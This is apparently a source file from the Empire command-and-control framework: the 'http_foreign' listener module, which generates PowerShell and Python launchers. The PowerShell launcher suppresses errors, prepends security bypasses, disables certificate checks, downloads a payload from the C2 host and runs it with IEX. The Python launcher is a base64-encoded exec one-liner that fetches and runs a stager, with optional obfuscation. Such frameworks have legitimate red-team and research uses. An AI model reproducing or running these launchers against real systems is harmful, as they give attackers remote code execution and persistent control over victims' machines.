import base64
import logging
import secrets
from textwrap import dedent

from empire.server.common import helpers, templating
from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ListenerValidationException
from empire.server.utils import data_util, listener_util

LOG_NAME_PREFIX = __name__
log = logging.getLogger(__name__)


class Listener:
    def __init__(self, mainMenu: MainMenu):
        self.mainMenu = mainMenu
        self.thread = None

    def post_init(self):
        self.options["Host"]["Value"] = f"http://{helpers.lhost()}"

        # optional/specific for this module
        self.host_address = None
        self.app = None
        self.uris = [
            a.strip("/")
            for a in self.options["DefaultProfile"]["Value"].split("|")[0].split(",")
        ]

        # set the default staging key to the controller db default
        self.options["StagingKey"]["Value"] = str(
            data_util.get_config("staging_key")[0]
        )

        self.session_cookie = self.options["Cookie"]["Value"]
        self.instance_log = log

    def default_response(self):
        """
        If there's a default response expected from the server that the client needs to ignore,
        (i.e. a default HTTP page), put the generation here.
        """
        return ""

    def validate_options(self) -> None:
        """
        Validate all options for this listener.
        """

        self.uris = [
            a.strip("/")
            for a in self.options["DefaultProfile"]["Value"].split("|")[0].split(",")
        ]

        self.host_address, err = self.mainMenu.listenersv2.validate_listener_address(
            self.options
        )
        if err:
            raise ListenerValidationException(err)

    def generate_launcher(
        self,
        encode=True,
        obfuscate=False,
        obfuscation_command="",
        user_agent="default",
        proxy="default",
        proxy_creds="default",
        language=None,
        listener_name=None,
        bypasses: list[str] | None = None,
    ):
        """
        Generate a basic launcher for the specified listener.
        """
        bypasses = [] if bypasses is None else bypasses

        if not language:
            log.error(
                "listeners/http_foreign generate_launcher(): no language specified!"
            )
            return None

        launcher = self.options["Launcher"]["Value"]
        stagingKey = self.options["StagingKey"]["Value"]
        profile = self.options["DefaultProfile"]["Value"]
        uris = list(profile.split("|")[0].split(","))
        stage0 = secrets.choice(uris)
        customHeaders = profile.split("|")[2:]
        cookie = self.options["Cookie"]["Value"]

        if language == "powershell":
            stager = '$ErrorActionPreference = "SilentlyContinue";'

            for bypass in bypasses:
                stager += bypass

            stager += "$wc=New-Object System.Net.WebClient;"

            if user_agent.lower() == "default":
                profile = self.options["DefaultProfile"]["Value"]
                user_agent = profile.split("|")[1]
            stager += f"$u='{user_agent}';"

            if "https" in self.host_address:
                # allow for self-signed certificates for https connections
                stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

            if user_agent.lower() != "none" or proxy.lower() != "none":
                if user_agent.lower() != "none":
                    stager += "$wc.Headers.Add('User-Agent',$u);"

                if proxy.lower() != "none":
                    if proxy.lower() == "default":
                        stager += "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"

                    else:
                        # TODO: implement form for other proxy
                        stager += "$proxy=New-Object Net.WebProxy;"
                        stager += f"$proxy.Address = '{proxy.lower()}';"
                        stager += "$wc.Proxy = $proxy;"

                    if proxy_creds.lower() == "default":
                        stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"

                    else:
                        # TODO: implement form for other proxy credentials
                        username = proxy_creds.split(":")[0]
                        password = proxy_creds.split(":")[1]
                        domain = username.split("\\")[0]
                        usr = username.split("\\")[1]
                        stager += f"$netcred = New-Object System.Net.NetworkCredential('{usr}', '{password}', '{domain}');"
                        stager += "$wc.Proxy.Credentials = $netcred;"

            # Add custom headers if any
            if customHeaders != []:
                for header in customHeaders:
                    headerKey = header.split(":")[0]
                    headerValue = header.split(":")[1]
                    stager += f'$wc.Headers.Add("{headerKey}","{headerValue}");'

            # code to turn the key string into a byte array
            stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{stagingKey}');"

            # Use routingpacket from foreign listener
            b64RoutingPacket = self.options["RoutingPacket"]["Value"]

            # add the routing packet to a cookie
            stager += f'$wc.Headers.Add("Cookie","{cookie}={b64RoutingPacket}");'

            stager += f"$ser= {helpers.obfuscate_call_home_address(self.host_address)};$t='{stage0}';"
            stager += "$data=$wc.DownloadData($ser+$t);"

            # decode everything and kick it over to IEX to kick off execution
            stager += "IEX ([Text.Encoding]::UTF8.GetString($data))"

            # Remove comments and make one line
            stager = helpers.strip_powershell_comments(stager)
            stager = data_util.ps_convert_to_oneliner(stager)

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.obfuscate(
                    stager,
                    obfuscation_command=obfuscation_command,
                )

            # base64 encode the stager and return it
            if encode and (
                (not obfuscate) or ("launcher" not in obfuscation_command.lower())
            ):
                return helpers.powershell_launcher(stager, launcher)
            # otherwise return the case-randomized stager
            return stager

        if language in ["python", "ironpython"]:
            launcherBase = "import sys;"
            if "https" in self.host_address:
                # monkey patch ssl woohooo
                launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"

            for bypass in bypasses:
                launcherBase += bypass

            if user_agent.lower() == "default":
                profile = self.options["DefaultProfile"]["Value"]
                user_agent = profile.split("|")[1]

            launcherBase += dedent(
                f"""
                o=__import__({{2:'urllib2',3:'urllib.request'}}[sys.version_info[0]],fromlist=['build_opener']).build_opener();
                UA='{user_agent}';
                server='{self.host_address}';t='{stage0}';
                """
            )

            b64RoutingPacket = self.options["RoutingPacket"]["Value"]

            # add the routing packet to a cookie
            launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "{cookie}={b64RoutingPacket}")];\n'
            launcherBase += "import urllib.request;\n"

            if proxy.lower() != "none":
                if proxy.lower() == "default":
                    launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                else:
                    proto = proxy.split(":")[0]
                    launcherBase += (
                        "proxy = urllib.request.ProxyHandler({'"
                        + proto
                        + "':'"
                        + proxy
                        + "'});\n"
                    )

                if proxy_creds != "none":
                    if proxy_creds == "default":
                        launcherBase += "o = urllib.request.build_opener(proxy);\n"
                    else:
                        launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();\n"
                        username = proxy_creds.split(":")[0]
                        password = proxy_creds.split(":")[1]
                        launcherBase += (
                            "proxy_auth_handler.add_password(None,'"
                            + proxy
                            + "','"
                            + username
                            + "','"
                            + password
                            + "');\n"
                        )
                        launcherBase += "o = urllib.request.build_opener(proxy, proxy_auth_handler);\n"
                else:
                    launcherBase += "o = urllib.request.build_opener(proxy);\n"
            else:
                launcherBase += "o = urllib.request.build_opener();\n"

            # install proxy and creds globally, so they can be used with urlopen.
            launcherBase += "urllib.request.install_opener(o);\n"
            launcherBase += "data=o.open(server+t).read();\n"

            # download the stager and extract the IV
            launcherBase += listener_util.python_extract_stager(stagingKey)

            if obfuscate:
                launcherBase = self.mainMenu.obfuscationv2.python_obfuscate(
                    launcherBase
                )

            if encode:
                launchEncoded = base64.b64encode(launcherBase.encode("UTF-8")).decode(
                    "UTF-8"
                )
                if isinstance(launchEncoded, bytes):
                    launchEncoded = launchEncoded.decode("UTF-8")
                return f"echo \"import sys,base64;exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
            return launcherBase

        log.error(
            "listeners/http_foreign generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
        )
        return None

    def generate_stager(
        self,
        listenerOptions,
        encode=False,
        encrypt=True,
        obfuscate=False,
        obfuscation_command="",
        language=None,
    ):
        """
        If you want to support staging for the listener module, generate_stager must be
        implemented to return the stage1 key-negotiation stager code.
        """
        log.error("generate_stager() not implemented for listeners/template")
        return ""

    def generate_agent(
        self, listenerOptions, language=None, obfuscate=False, obfuscation_command=""
    ):
        """
        If you want to support staging for the listener module, generate_agent must be
        implemented to return the actual staged agent code.
        """
        log.error("generate_agent() not implemented for listeners/template")
        return ""

    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.

        This is so agents can easily be dynamically updated for the new listener.
        """
        if not language:
            log.error("listeners/http_foreign generate_comms(): no language specified!")
            return None

        if language.lower() == "powershell":
            template_path = [
                self.mainMenu.install_path / "listeners",
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/http.ps1.j2")

            template_options = {
                "session_cookie": self.session_cookie,
                "host": self.host_address,
                "custom_headers": listener_util.parse_custom_headers(
                    self.options["DefaultProfile"]["Value"]
                ),
            }

            return template.render(template_options)

        if language.lower() == "python":
            template_path = [
                self.mainMenu.install_path / "listeners",
            ]
            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/comms.py.j2")

            template_options = {
                "session_cookie": self.session_cookie,
                "host": self.host_address,
            }

            return template.render(template_options)

        log.error(
            "listeners/http_foreign generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module."
        )
        return None

    def start(self):
        """
        Nothing to actually start for a foreign listner.
        """
        return True

    def shutdown(self):
        """
        Nothing to actually shut down for a foreign listner.
        """
        pass
